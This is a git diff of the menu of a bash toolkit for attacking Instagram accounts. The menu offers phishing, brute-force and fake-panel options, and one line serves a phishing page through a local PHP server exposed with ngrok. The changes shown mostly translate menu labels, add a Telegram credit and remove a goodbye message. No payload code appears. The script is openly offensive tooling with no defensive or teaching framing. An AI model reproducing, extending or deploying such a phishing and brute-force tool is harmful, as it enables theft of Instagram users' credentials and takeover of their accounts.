@@ -20,10 +20,11 @@ echo -e '\033[32;40;1m
 echo -e "\033[31;40;1m
 \033[31;40;1m[01]\e[37mİnstagram Phishing          \033[31;40;1m[02]\e[37mİnstagram Brute-Force
 \033[31;40;1m[03]\e[37mİnstagram Fake Panel
-\e[31m[00]\e[37m Menü
-\e[31m[99]\e[37m Exit
+
+\e[31m[00]\e[37m Menyu
+\e[31m[99]\e[37m Çıxış
 "
-echo -e "\033[32;40;1m                      Nihat 「 FARZ 」"
+echo -e "\033[32;40;1m    Telegram                  Nihat 「 FARZ 」"
 echo ""
 read -p "Seçim Edin : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
@@ -54,7 +55,7 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 	elif [[ $islem == 9 || $islem == 99 ]]; then
 	clear
-	echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+	echo -e ""
 	sleep 1 
 	exit 1
 elif [[ $islem == 00 ]]; then
